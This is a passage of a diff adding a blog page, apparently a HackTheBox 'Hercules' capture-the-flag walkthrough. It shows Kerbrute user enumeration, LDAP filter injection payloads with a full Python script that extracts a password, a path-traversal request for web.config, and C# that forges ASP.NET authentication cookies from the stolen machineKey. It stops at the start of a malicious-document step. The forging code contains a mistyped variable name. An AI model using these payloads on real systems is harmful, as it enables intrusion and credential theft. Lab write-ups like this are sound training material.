@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox - Hercules: Active Directory, Kerberos Delegation &amp; LDAP Injection Walkthrough | uziii2208</title>
+
+  <!-- Favicon & Brand Icons -->
+  <link rel="icon" type="image/svg+xml" href="../../favicon.svg">
+  <link rel="icon" type="image/png" sizes="64x64" href="../../favicon.png">
+  <link rel="alternate icon" href="../../favicon.ico">
+
+  <!-- OpenGraph / Twitter Meta -->
+  <meta name="description" content="Hercules is an Insane-difficulty Windows machine that requires extensive knowledge of Active Directory attacks and Kerberos authentication. The domain has NTLM disabled,...">
+  <meta name="author" content="@uziii2208">
+  <meta property="og:title" content="HackTheBox - Hercules: Active Directory, Kerberos Delegation &amp; LDAP Injection Walkthrough">
+  <meta property="og:description" content="Hercules is an Insane-difficulty Windows machine that requires extensive knowledge of Active Directory attacks and Kerberos authentication. The domain has NTLM disabled,...">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://uziii2208.github.io/post/hackthebox-hercules/">
+  <meta property="og:image" content="https://uziii2208.github.io/og-hero.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HackTheBox - Hercules: Active Directory, Kerberos Delegation &amp; LDAP Injection Walkthrough">
+  <meta name="twitter:description" content="Hercules is an Insane-difficulty Windows machine that requires extensive knowledge of Active Directory attacks and Kerberos authentication. The domain has NTLM disabled,...">
+  <meta name="twitter:image" content="https://uziii2208.github.io/og-hero.png">
+
+  <!-- Fonts & Stylesheet -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  
+  <!-- Relative link to CSS -->
+  <link rel="stylesheet" href="../../css/style.css">
+
+  <!-- Code Highlighting -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <!-- Application Logic -->
+  <script src="../../js/app.js" defer></script>
+</head>
+<body class="page-post">
+
+<!-- ─── INTERACTIVE CYBER BACKGROUND CANVAS ─── -->
+<canvas id="cyber-canvas"></canvas>
+
+<!-- ─── READING PROGRESS LASER BAR ─── -->
+<div id="reading-progress"></div>
+
+<!-- ─── NAVIGATION ─── -->
+<nav>
+  <div class="nav-left">
+    <a class="nav-logo scramble-hover" href="/" onclick="return navigateToHome(event)">uziii<span>2208</span></a>
+    <ul class="nav-links">
+      <li><a href="/" id="nav-link-home" onclick="return navigateToHome(event)">home</a></li>
+      <li><a href="../../post/" class="active">write-ups</a></li>
+      <li><a href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer">github</a></li>
+    </ul>
+  </div>
+  
+  <div class="nav-right">
+    <button id="sfx-toggle" class="btn-sfx" onclick="toggleSFX()" title="Toggle Cyber Sound Effects">
+      <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path class="sfx-wave" d="M15.54 8.46a5 5 0 0 1 0 7.07"></path><path class="sfx-wave-2" d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg>
+      <span>SFX:</span> <span id="sfx-status">ON</span>
+    </button>
+    <div class="nav-shortcuts" title="Keyboard Shortcuts">
+      <span class="shortcut-chip" onclick="openCmdPalette()"><kbd>/</kbd> search</span>
+      <span class="shortcut-chip" onclick="navigateToHome(event)"><kbd>esc</kbd> home</span>
+    </div>
+    <a class="nav-tag" href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer">@uziii2208</a>
+  </div>
+</nav>
+
+<!-- ─── POST VIEW CONTAINER ─── -->
+<div id="post-view" style="display:block;">
+  <main>
+    <!-- Breadcrumbs -->
+    <div class="breadcrumb">
+      <a href="/" onclick="return navigateToHome(event)">home</a>
+      <span class="sep">//</span>
+      <a href="../../post/">write-ups</a>
+      <span class="sep">//</span>
+      <span class="crumb-current">hackthebox-hercules</span>
+    </div>
+
+    <!-- Top Action Bar -->
+    <div class="post-view-top-bar">
+      <a class="back-btn" href="../../post/">
+        <svg class="ui-icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        <span>ALL WRITE-UPS</span>
+      </a>
+      <div class="post-ctrl-btns">
+        <button class="btn-ctrl" onclick="sharePost()" title="Share Advisory Link">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+          <span>SHARE</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Article Header -->
+    <div class="post-view-header">
+      <div class="post-tags" style="flex-direction:row;margin-bottom:1.2rem;gap:8px;align-items:center;">
+        <a href="../../post/?tag=htb" class="tag tag-htb" onclick="return navigateToTag(event, 'htb')" title="Filter by tag: htb">htb</a><a href="../../post/?tag=ctf" class="tag tag-ctf" onclick="return navigateToTag(event, 'ctf')" title="Filter by tag: ctf">ctf</a><a href="../../post/?tag=windows" class="tag tag-windows" onclick="return navigateToTag(event, 'windows')" title="Filter by tag: windows">windows</a>
+      </div>
+      <h1 class="post-view-title">HackTheBox - Hercules: Active Directory, Kerberos Delegation &amp; LDAP Injection Walkthrough</h1>
+      <div class="post-meta-bar">
+        <span class="meta-item">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          2025-10-21
+        </span>
+        <span class="meta-sep">/</span>
+        <span class="meta-item">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          31 min read
+        </span>
+        <span class="meta-sep">/</span>
+        <span class="meta-item meta-author">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+          @uziii2208
+        </span>
+      </div>
+    </div>
+
+    <!-- Two-Column Article Layout with Sticky TOC -->
+    <div class="post-body-layout">
+      <article class="post-main-content">
+        <div class="md-content" id="post-view-content">
+<p><img src="../../photos/hercules/image.png" alt="image.png" /></p>
+<h2 id="introduction">Introduction</h2>
+<p>Hercules is an Insane-difficulty Windows machine that requires extensive knowledge of Active Directory attacks and Kerberos authentication. The domain has NTLM disabled, forcing attackers to work exclusively with Kerberos. A unique defensive mechanism is an automated cleanup script that resets passwords, ACLs, and group memberships every few minutes, reverting any manual changes.</p>
+<h2 id="attack-narrative">Attack Narrative</h2>
+<p>The attack path begins with <code>LDAP filter injection</code> to extract credentials from user description fields. Through LFI, the machineKey is obtained to <code>forge authentication cookies</code> and access a file upload feature. A malicious document triggers <code>NetNTLMv2</code> authentication, allowing hash capture and cracking. BloodHound reveals complex group relationships, enabling certificatebased attacks (<code>ESC3</code>, <code>ESC8</code>) and <code>RBCD exploitation</code>. The final privilege escalation involves <code>S4U2Self</code>/<code>S4U2Proxy</code> delegation abuse to gain <code>Domain Admin</code> access.</p>
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+<pre><code class="language-bash">$ rustscan -a 10.10.11.91 --ulimit 10000 -- -sCTV -Pn
+...[snip]...
+Open 10.10.11.91:53
+Open 10.10.11.91:88
+Open 10.10.11.91:80
+Open 10.10.11.91:139
+Open 10.10.11.91:135
+Open 10.10.11.91:389
+Open 10.10.11.91:443
+Open 10.10.11.91:445
+Open 10.10.11.91:464
+Open 10.10.11.91:593
+Open 10.10.11.91:636
+Open 10.10.11.91:3268
+Open 10.10.11.91:3269
+Open 10.10.11.91:5986
+Open 10.10.11.91:9389
+Open 10.10.11.91:49670
+Open 10.10.11.91:49667
+Open 10.10.11.91:49664
+Open 10.10.11.91:49679
+Open 10.10.11.91:57436
+Open 10.10.11.91:65489
+</code></pre>
+<p><img src="../../photos/hercules/image%201.png" alt="image.png" /></p>
+<h2 id="hosting">Hosting</h2>
+<pre><code class="language-bash">10.10.11.91 dc.hercules.htb hercules.htb
+</code></pre>
+<h2 id="krb5-config">Krb5 Config</h2>
+<pre><code class="language-swift">[libdefaults]
+        default_realm = HERCULES.HTB
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        fcc-mit-ticketflags = true
+        dns_canonicalize_hostname = false
+        dns_lookup_realm = false
+        dns_lookup_kdc = true
+        k5login_authoritative = false
+[realms]
+        HERCULES.HTB = {
+                kdc = dc.hercules.htb
+                admin_server = dc.hercules.htb
+                default_admin = hercules.htb
+        }
+[domain_realm]
+        .hercules.htb = HERCULES.HTB
+        hercules.htb = HERCULES.HTB
+</code></pre>
+<h2 id="user-enumeration">User Enumeration</h2>
+<p>We enumerate domain users with Kerbrute using a 10M username list &amp; found some usernames</p>
+<pre><code class="language-swift">$ kerbrute userenum --dc 10.10.11.91 -d hercules.htb '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' -t 100
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-bash">2025/10/19 16:53:55 &gt;  [+] VALID USERNAME:       admin@hercules.htb
+2025/10/19 16:54:42 &gt;  [+] VALID USERNAME:       administrator@hercules.htb
+2025/10/19 16:54:46 &gt;  [+] VALID USERNAME:       Admin@hercules.htb
+2025/10/19 16:55:29 &gt;  [+] VALID USERNAME:       Administrator@hercules.htb
+2025/10/19 16:56:02 &gt;  [+] VALID USERNAME:       auditor@hercules.htb
+</code></pre>
+<p><img src="../../photos/hercules/image%202.png" alt="image.png" /></p>
+<p>Let’s generate names wordlist with appended letters</p>
+<pre><code class="language-bash">$ awk ' /^[[:space:]]*$/ {next} { gsub(/^[ \t]+|[ \t]+$/,&quot;&quot;); for(i=97;i&lt;=122;i++) printf &quot;%s.%c\n&quot;, $0, i }' \
+ /usr/share/wordlists/seclists/Usernames/Names/names.txt | tee /usr/share/wordlists/seclists/Usernames/Names/names.withletters.txt &gt; /dev/null &amp;&amp; echo &quot;Created: /usr/share/wordlists/seclists/Usernames/Names/names.withletters.txt&quot;
+</code></pre>
+<p>I’m enumerate domain users with Kerbrute against the DC</p>
+<pre><code class="language-bash">$ kerbrute userenum --dc 10.10.11.91 -d hercules.htb '/usr/share/wordlists/seclists/Usernames/Names/names.withletters.txt' -t 100
+</code></pre>
+<p><img src="../../photos/hercules/image%203.png" alt="image.png" /></p>
+<h2 id="directory-fuzzing">Directory Fuzzing</h2>
+<p>We brute-force web directories on the target</p>
+<pre><code class="language-bash">$ dirb https://hercules.htb
+</code></pre>
+<p><img src="../../photos/hercules/image%204.png" alt="image.png" /></p>
+<p>Nothing usefull overthere, but I think I can try to login at Login Page</p>
+<h2 id="web-exploring">Web Exploring</h2>
+<p>I try to login with dummy credential but it got invaild</p>
+<p><img src="../../photos/hercules/image%205.png" alt="image.png" /></p>
+<p>But, If I’ll try to login with Hercules user’s (<code>adriana.i</code> &amp; more), it got <code>Login attempt fail</code>.</p>
+<p><img src="../../photos/hercules/image%206.png" alt="image.png" /></p>
+<p>Same issue like other users, I can be confirm <code>Auditor it’s not web audit’or</code> (also can't be with web login for now)</p>
+<p><img src="../../photos/hercules/image%207.png" alt="image.png" /></p>
+<aside>
+⚠️ **So I can see login requests are subject to rate-limit**
+<p><img src="../../photos/hercules/image%208.png" alt="image.png" /></p>
+</aside>
+<p>After the 14th try. I’ve got request denied for 30 seconds</p>
+<p><img src="../../photos/hercules/image%209.png" alt="image.png" /></p>
+<blockquote>
+<p><strong>The application may be susceptible to LDAP Filter Injection. If confirmed, this could be exploited to exfiltrate data from user object fields, including the 'Description' attribute, which may contain sensitive information.</strong></p>
+</blockquote>
+<h2 id="ldap-injection-attacks-explaining"><strong>LDAP Injection Attacks Explaining</strong></h2>
+<p><a href="https://brightsec.com/blog/ldap-injection/">LDAP Injection Guide: Types, Examples, Prevention</a></p>
+<aside>
+ℹ️
+<p><strong>We want to read the description field of a user object by exploiting an LDAP injection via the login form and reconstructing the field character by character (prefix-based).</strong></p>
+<p><strong>Two measurable tests (examples)</strong></p>
+<aside>
+🚫
+<p>Fail</p>
+<p><strong>Raw payload (without encoding)</strong></p>
+<pre><code class="language-sql">will.s*)(description=*)
+</code></pre>
+<blockquote>
+<p><strong>Response: “Invalid username”. The filter is not (correctly) evaluated in this form or does not return any results</strong></p>
+</blockquote>
+<p><img src="../../photos/hercules/image%2010.png" alt="image.png" /></p>
+</aside>
+<aside>
+✅
+<p>Success</p>
+<p><strong>Payload with double URL encoding (as used in the script):</strong></p>
+<pre><code class="language-sql">will.s%252A%2529%2528description%253D%252A
+</code></pre>
+<blockquote>
+<p><strong>Answer: “Login attempt failed”. The injected LDAP filter is evaluated internally and matches, i.e. the description attribute exists / matches the filter</strong></p>
+</blockquote>
+<p><img src="../../photos/hercules/image%2011.png" alt="image.png" /></p>
+</aside>
+</aside>
+<aside>
+📌
+<p><strong>The comparison of these two responses proves that the backend accepts
+LDAP filter expressions from the username - assuming the payload is
+transmitted correctly (double-URL-encoded)</strong></p>
+</aside>
+<h2 id="bruteforce-username-description-ldap-filter-injection-password-spraying">Bruteforce Username Description (LDAP-Filter-Injection - Password Spraying)</h2>
+<p>Save the script as file name <code>passwd_spray.py</code> via content below here:</p>
+<pre><code class="language-bash">#!/usr/bin/env python3
+import requests
+import string
+import urllib3
+import re
+import time
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+HOST = &quot;https://10.10.11.91&quot;
+VERIFY_SSL = False
+SUCCESS_FLAG = &quot;Login attempt failed&quot;
+
+TOKEN_REGEX = re.compile(r'name=&quot;__RequestVerificationToken&quot;\s+type=&quot;hidden&quot;\s+value=&quot;([^&quot;]+)&quot;', re.IGNORECASE)
+
+PATH_VARIANTS = [
+    &quot;login&quot;, &quot;logiN&quot;, &quot;logIn&quot;, &quot;logIN&quot;, &quot;loGin&quot;, &quot;loGiN&quot;, &quot;loGIn&quot;, &quot;loGIN&quot;,
+    &quot;lOgin&quot;, &quot;lOgiN&quot;, &quot;lOgIn&quot;, &quot;lOgIN&quot;, &quot;lOGin&quot;, &quot;lOGiN&quot;, &quot;lOGIn&quot;, &quot;lOGIN&quot;,
+    &quot;Login&quot;, &quot;LogiN&quot;, &quot;LogIn&quot;, &quot;LogIN&quot;, &quot;LoGin&quot;, &quot;LoGiN&quot;, &quot;LoGIn&quot;, &quot;LoGIN&quot;,
+    &quot;LOgin&quot;, &quot;LOgiN&quot;, &quot;LOgIn&quot;, &quot;LOgIN&quot;, &quot;LOGin&quot;, &quot;LOGiN&quot;, &quot;LOGIn&quot;, &quot;LOGIN&quot;
+]
+
+USER_LIST = [
+    &quot;adriana.i&quot;, &quot;angelo.o&quot;, &quot;anthony.r&quot;, &quot;ashley.b&quot;, &quot;auditor&quot;, &quot;bob.w&quot;,
+    &quot;camilla.b&quot;, &quot;clarissa.c&quot;, &quot;elijah.m&quot;, &quot;fernando.r&quot;, &quot;fiona.c&quot;, &quot;harris.d&quot;,
+    &quot;heather.s&quot;, &quot;jacob.b&quot;, &quot;james.s&quot;, &quot;jennifer.a&quot;, &quot;jessica.e&quot;, &quot;joel.c&quot;,
+    &quot;johanna.f&quot;, &quot;johnathan.j&quot;, &quot;ken.w&quot;, &quot;mark.s&quot;, &quot;mikayla.a&quot;, &quot;natalie.a&quot;,
+    &quot;nate.h&quot;, &quot;patrick.s&quot;, &quot;ramona.l&quot;, &quot;ray.n&quot;, &quot;rene.s&quot;, &quot;shae.j&quot;,
+    &quot;stephanie.w&quot;, &quot;stephen.m&quot;, &quot;tanya.r&quot;, &quot;taylor.m&quot;, &quot;tish.c&quot;, &quot;vincent.g&quot;,
+    &quot;web_admin&quot;, &quot;will.s&quot;, &quot;winda.s&quot;, &quot;zeke.s&quot;
+]
+
+def fetch_csrf_token(client):
+    target_path = PATH_VARIANTS[0].lower()
+    response = client.get(f&quot;{HOST}/{target_path}&quot;, verify=VERIFY_SSL)
+    match = TOKEN_REGEX.search(response.text)
+    return match.group(1) if match else None
+
+def check_ldap_injection(user, desc_prefix=&quot;&quot;):
+    client = requests.Session()
+    csrf_token = fetch_csrf_token(client)
+    if not csrf_token:
+        return False
+
+    path_variant = PATH_VARIANTS[len(desc_prefix) % len(PATH_VARIANTS)]
+    target_url = f&quot;{HOST}/{path_variant}&quot;
+
+    # Build LDAP injection payload
+    if desc_prefix:
+        # Escape special characters
+        escaped_desc = desc_prefix
+        if '*' in escaped_desc:
+            escaped_desc = escaped_desc.replace('*', '\\2a')
+        if '(' in escaped_desc:
+            escaped_desc = escaped_desc.replace('(', '\\28')
+        if ')' in escaped_desc:
+            escaped_desc = escaped_desc.replace(')', '\\29')
+        
+        payload = f&quot;{user}*)(description={escaped_desc}*&quot;
+    else:
+        # Check if user has description field
+        payload = f&quot;{user}*)(description=*&quot;
+
+    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
+
+    form_data = {
+        &quot;Username&quot;: encoded_payload,
+        &quot;Password&quot;: &quot;test&quot;,
+        &quot;RememberMe&quot;: &quot;false&quot;,
+        &quot;__RequestVerificationToken&quot;: csrf_token
+    }
+
+    try:
+        response = client.post(target_url, data=form_data, verify=VERIFY_SSL, timeout=5)
+        return SUCCESS_FLAG in response.text
+    except:
+        return False
+
+def extract_user_description(user):
+    char_set = (
+        string.ascii_lowercase +
+        string.digits +
+        string.ascii_uppercase +
+        &quot;!@#$_*-.&quot; +
+        &quot;%^&amp;()=+[]{}|;:',&lt;&gt;?/`~\&quot; \\&quot;
+    )
+
+    if not check_ldap_injection(user):
+        return None
+
+    found_desc = &quot;&quot;
+    max_len = 50
+    empty_count = 0
+
+    for pos in range(max_len):
+        char_found = False
+
+        for ch in char_set:
+            current_test = found_desc + ch
+            print(f&quot;Testing {user}: {current_test}&quot;, end=&quot;\r&quot;)
+
+            if check_ldap_injection(user, current_test):
+                found_desc += ch
+                char_found = True
+                empty_count = 0
+                print(f&quot;\nFound character: '{ch}' - Current: {found_desc}&quot;)
+                break
+
+            time.sleep(0.01)
+
+        if not char_found:
+            empty_count += 1
+            if empty_count &gt;= 2:
+                break
+
+    return found_desc if found_desc else None
+
+def execute_enumeration():
+    important_users = [&quot;web_admin&quot;, &quot;auditor&quot;, &quot;Administrator&quot;, &quot;natalie.a&quot;, &quot;ken.w&quot;]
+    remaining_users = [u for u in USER_LIST if u not in important_users]
+
+    results = {}
+
+    for account in important_users + remaining_users:
+        print(f&quot;\nStarting enumeration for: {account}&quot;)
+        extracted_data = extract_user_description(account)
+
+        if extracted_data:
+            results[account] = extracted_data
+            print(f&quot;\n[SUCCESS] {account}: {extracted_data}&quot;)
+
+            with open(&quot;extracted_data.txt&quot;, &quot;a&quot;) as output_file:
+                output_file.write(f&quot;{account}:{extracted_data}\n&quot;)
+
+    if results:
+        print(&quot;\n=== FINAL RESULTS ===&quot;)
+        for account, data in results.items():
+            print(f&quot;{account}: {data}&quot;)
+    else:
+        print(&quot;\nNo data extracted&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    execute_enumeration()
+</code></pre>
+<p>Output:</p>
+<p><img src="../../photos/hercules/image%2012.png" alt="image.png" /></p>
+<aside>
+🔥
+<p><strong>Final results:</strong></p>
+<blockquote>
+<p><strong>[+] johnathan.j: change*th1s_p@ssw()rd!!</strong></p>
+</blockquote>
+</aside>
+<h2 id="verify-ldap-credentials">Verify LDAP Credentials</h2>
+<p>I’m gonna try the password of <code>johnathan.j</code> with NetExec</p>
+<pre><code class="language-sql">$ nxc ldap 10.10.11.91 -u johnathan.j -p 'change*th1s_p@ssw()rd!!' -k
+</code></pre>
+<pre><code class="language-sql">LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
+LDAP        10.10.11.91     389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+</code></pre>
+<p>Cuz we fail on preauth KDC, also the login with user <code>johnathan.j</code> is not possible</p>
+<p><img src="../../photos/hercules/image%2013.png" alt="image.png" /></p>
+<p>But don’t worries about it, let’s enumerate LDAP users via Kerberos using a password list</p>
+<pre><code class="language-sql">$ nxc ldap 10.10.11.91 -u 'users.txt' -p 'change*th1s_p@ssw()rd!!' --continue-on-success -k
+</code></pre>
+<p><img src="../../photos/hercules/image%2014.png" alt="image.png" /></p>
+<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>
+<p>We login as ken.w in the Login Panel &amp; got the Dashboard now!</p>
+<p><img src="../../photos/hercules/image%2025.png" alt="image.png" /></p>
+<p>We found 3 new message of <code>ken.w</code></p>
+<p><img src="../../photos/hercules/image%2026.png" alt="image.png" /></p>
+<p>Details of these:</p>
+<p><img src="../../photos/hercules/image%2027.png" alt="image.png" />
+<img src="../../photos/hercules/image%2028.png" alt="image.png" />
+<img src="../../photos/hercules/image%2029.png" alt="image.png" /></p>
+<h2 id="get-web-config-via-lfi-machinekey">Get web.config via LFI (machineKey)</h2>
+<p>We have Path Traversal with LFI payload like this</p>
+<pre><code>GET /Home/Download?fileName=../../web.config HTTP/2
+</code></pre>
+<blockquote>
+<p>It targets the <code>/Home/Download</code> feature, which is supposed to serve files. The attacker injects <code>../../</code> into the fileName parameter to “climb” up two directory levels, escaping the intended download folder. The goal is to trick the server into reading the highly sensitive <code>web.config</code> file instead of a normal file. This <code>web.config</code> file often contains critical information like database passwords and API keys.</p>
+</blockquote>
+<p><img src="../../photos/hercules/image%2030.png" alt="image.png" /></p>
+<p>Retrieves the <code>web.config</code> file containing sensitive configuration</p>
+<p><img src="../../photos/hercules/image%2031.png" alt="image.png" /></p>
+<p>We found these creds into <code>web.config</code> file:</p>
+<pre><code>decryptionKey=&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;
+validation=&quot;HMACSHA256&quot; validationKey=&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;
+</code></pre>
+<p>We successfully retrieved <code>web.config</code> ; the key finding is the machineKey.</p>
+<h2 id="cookie-forgery-attack-formsauthenticationticket">Cookie Forgery Attack (FormsAuthenticationTicket)</h2>
+<p>We create a <code>.NET</code> console with a new directory named <code>LegacyAuthConsole</code> and put all the new project files inside it</p>
+<pre><code class="language-bash">$ dotnet new console -o LegacyAuthConsole &amp;&amp; cd LegacyAuthConsole
+</code></pre>
+<p>Next, we run cmd like in below cuz it’ll It <code>installs the special library</code> we need.</p>
+<pre><code class="language-bash">$ dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
+</code></pre>
+<blockquote>
+<p><strong>Explaination</strong>:</p>
+<p><code>dotnet add package</code>: This tells dotnet to find a package on the public <code>NuGet</code> repository (a “store” for .NET code) and add it to your project.</p>
+<p><code>AspNetCore.LegacyAuthCookieCompat</code>: This is the specific package that contains the classes for creating old-style authentication cookies. The <code>LegacyFormsAuthenticationTicketEncryptor</code> class from your C# script is inside this package.</p>
+<p><code>--version 2.0.5</code>: This pins the installation to a specific version. This guide likely found that this exact version works reliably for the exploit.</p>
+</blockquote>
+<p>Finally, we should be restore the <code>.NET</code> package</p>
+<pre><code class="language-bash">$ dotnet restore
+</code></pre>
+<p>Okay, in next step we should be create the file named <code>program.cs</code> like below here:</p>
+<pre><code class="language-c#">using System;
+using System.Web.Security;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        string validationKey = &quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;;
+        string decryptionKey = &quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;;
+
+        var issueDate = DateTime.Now;
+        var expiryDate = issueDate.AddHours(1);
+
+        var formsAuthenticationTicket = new FormsAuthenticationTicket(
+            1,                          // Version
+            &quot;web_admin&quot;,                // User name
+            issueDate,                  // Issue date
+            expiryDate,                 // Expiry date
+            false,                      // isPersistent
+            &quot;Web Administrators&quot;,       // User data
+            &quot;/&quot;                         // Cookie path
+        );
+
+        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
+        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);
+
+        var legacyFormsAuthenticationTicketEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
+            decryptionKeyBytes,
+            validationKeyBytes,
+            ShaVersion.Sha256
+        );
+
+        var encryptedText = legacyFormsAuthenticationsAuthenticationTicketEncryptor.Encrypt(formsAuthenticationTicket);
+
+        Console.WriteLine(encryptedText);
+    }
+}
+</code></pre>
+<p>Execute it &amp; we found a cookie:)</p>
+<pre><code class="language-bash">$ dotnet build &amp;&amp; dotnet run
+9C5AD4397AAFF0E6E7B08A7AA540750C789841DD30B5C7C6EEFD16F7E995F870C82CFAB6E2C79F0DF5D34CA52C4ED7F8075D319E76D8B43D168C9E0DBE4AFDADBCB4D291BE34E144713484C70F4BC74454FC8A4B16B107C531C94F2DA818160315AA8186F7E62160E30F3B6BF45663FF6003F53E233ACFB3C781C6D74A5DE0CF377134C21F00E489F51DEAE9E5BB5B667117042AAF803E55C1B6421D85AAF12FFB9D361AB786D4C055CEC16B72BEBC55F6B73555182B33F44E601B1204A7E6A0
+</code></pre>
+<h2 id="web-admin-portal">Web Admin Portal</h2>
+<p>At the moment, we already in ken.w web session. So swap into Dashboard page &amp; open DevTools - insert the cookie we got in before</p>
+<p><img src="../../photos/hercules/image%2032.png" alt="image.png" /></p>
+<p>Refresh webpage &amp; boom…we got the <code>web_admin</code> user session now!</p>
+<p><img src="../../photos/hercules/image%2033.png" alt="image.png" /></p>
+<p>Come to Forms Page (<code>https://hercules.htb/Home/Forms</code>), we can see the <code>File upload</code> function. So hold on, let’s me explain</p>
+<p><img src="../../photos/hercules/image%2034.png" alt="image.png" /></p>
+<blockquote>
+<p>Summary of the Vulnerability</p>
+<p>The provided C# code snippet shows a file upload filter that is vulnerable to an attack designed to steal NTLM authentication hashes. The core issue is that the application only validates the file extension (checking for <code>.odt</code> or <code>.docx</code>) but <code>fails to validate the file’s actual content</code>.</p>
+<p>This allows an attacker to upload a maliciously crafted file—which may not be a valid document at all—as long as it has the correct extension. The goal is to get this file onto the server, where a separate process (like a document processor, a preview generator, or an administrator) will open it, triggering an outbound connection from the server to an attacker-controlled endpoint.</p>
+<p>Example:</p>
+<pre><code class="language-c#">else
+{
+   int num = 1048576;
+   if (model.UploadedFile.get_ContentLength() &gt;= num)
+   {
+       ((dynamic)(ControllerBase)this).get_ViewBag().Message = &quot;File too large.&quot;;
+   }
+   else
+   {
+       string[] source = new string[2] { &quot;.docx&quot;, &quot;.odt&quot; };
+       string text = &gt; Path.GetExtension(model.UploadedFile.Get_FileName()).ToLower();
+       if (!source.Contains(text))
+       {
+           ((dynamic)(ControllerBase)this).get_ViewBag().Message = &quot;File type is &gt; not supported.&quot;;
+       }
+       else
+       {
+           try
+           {
+               string path = $&quot;${Guid.NewGuid()}{text}&quot;;
+               string text2 = Path.Combine(&quot;C:\\inetpub\\Reports\\&quot;, &gt; Path.GetFileName(path));
+               model.UploadedFile.SaveAs(text2);
+               ((dynamic)(ControllerBase)this).get_ViewBag().Success = &quot;Thank you &gt; for your report!&quot;;
+           }
+           catch (Exception)
+           {
+           }
+       }
+   }
+}
+</code></pre>
+</blockquote>
+<h2 id="file-upload">File Upload</h2>
+<blockquote>
+<p>Malicious ODF File Creator : <a href="https://github.com/lof1sec/Bad-ODF">Click here to view</a></p>
+</blockquote>
+<p><img src="../../photos/hercules/image%2035.png" alt="image.png" /></p>
+<p>We should be run this script into venv (virtual environment). Also we run setup env first at all</p>
+<pre><code class="language-bash">$ python3 -m venv .venv &amp;&amp; source .venv/bin/activate &amp;&amp; pip install ezodf lxml
+</code></pre>
+<p>After that, we run the Bad-OOF script &amp; set ur tun0 as listener</p>
+<pre><code class="language-bash">$ python3 Bad-OOF.py                                
+/home/kali/Desktop/Hercules/Bad-OOF.py:29: SyntaxWarning: invalid escape sequence '\/'
+  / __ )____ _____/ /     / __ \/ __ \/ ____/
+
+    ____            __      ____  ____  ______
+   / __ )____ _____/ /     / __ \/ __ \/ ____/
+  / __  / __ `/ __  /_____/ / / / / / / /_    
